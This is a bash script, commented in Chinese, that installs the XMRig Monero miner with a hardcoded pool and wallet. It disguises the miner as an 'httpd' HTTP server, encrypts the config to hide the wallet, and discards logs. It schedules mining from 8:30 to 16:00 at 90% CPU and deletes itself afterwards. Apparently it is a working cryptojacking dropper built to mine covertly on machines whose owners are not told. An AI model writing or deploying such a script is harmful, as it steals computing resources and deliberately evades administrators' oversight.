#!/bin/bash

# 确保以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl openssl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入配置
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录并安装 httpd (xmrig)
mkdir -p /opt/utils
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 生成加密密钥
key=$(openssl rand -base64 32)
key_file="/etc/systemd/system/httpd.key"
echo "$key" > "$key_file"
chmod 600 "$key_file"

# 生成并加密配置
config="{\"pools\": [{\"url\": \"$pool_url\", \"user\": \"$wallet_address\", \"pass\": \"$pool_pass\", \"algo\": \"rx/0\"}], \"print-time\": 0, \"verbose\": false, \"donate-level\": 0}"
encrypted_config=$(echo "$config" | openssl enc -aes-256-cbc -a -salt -pass file:"$key_file")

# 创建 httpd 用户和组
if ! id "httpd" &>/dev/null; then
    groupadd -r httpd
    useradd -r -s /bin/false -g httpd httpd
fi

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
Environment="ENCRYPTED_CONFIG=$encrypted_config"
Environment="KEY_FILE=$key_file"
ExecStart=/bin/bash -c 'echo "\$ENCRYPTED_CONFIG" | openssl enc -d -aes-256-cbc -a -pass file:"\$KEY_FILE" | /opt/utils/httpd --config=- --no-color --log-file=/dev/null --threads=8'
Restart=always
CPUQuota=90%

[Install]
WantedBy=multi-user.target
EOF

# 创建定时器文件
cat > /etc/systemd/system/httpd-start.timer <<EOF
[Unit]
Description=Start HTTP Server at 8:30 AM

[Timer]
OnCalendar=*-*-* 08:30:00
Unit=httpd.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/stop-httpd.service <<EOF
[Unit]
Description=Stop HTTP Server

[Service]
Type=oneshot
ExecStart=/usr/bin/systemctl stop httpd.service
EOF

cat > /etc/systemd/system/stop-httpd.timer <<EOF
[Unit]
Description=Stop HTTP Server at 4:00 PM

[Timer]
OnCalendar=*-*-* 16:00:00
Unit=stop-httpd.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 启用并启动定时器
systemctl daemon-reload
systemctl enable httpd-start.timer
systemctl start httpd-start.timer
systemctl enable stop-httpd.timer
systemctl start stop-httpd.timer

# 根据当前时间决定是否立即启动
export TZ=Asia/Shanghai
current_time=$(date +%s)
start_time=$(date -d "today 08:30" +%s)
end_time=$(date -d "today 16:00" +%s)
if [ $current_time -ge $start_time ] && [ $current_time -lt $end_time ]; then
    systemctl start httpd.service
    echo "服务已启动，将在16:00停止"
else
    echo "当前不在运行时间段，等待8:30启动"
fi

echo "部署完成，服务将在每天8:30启动，16:00停止！"
rm -- "$0"  # 删除脚本自身
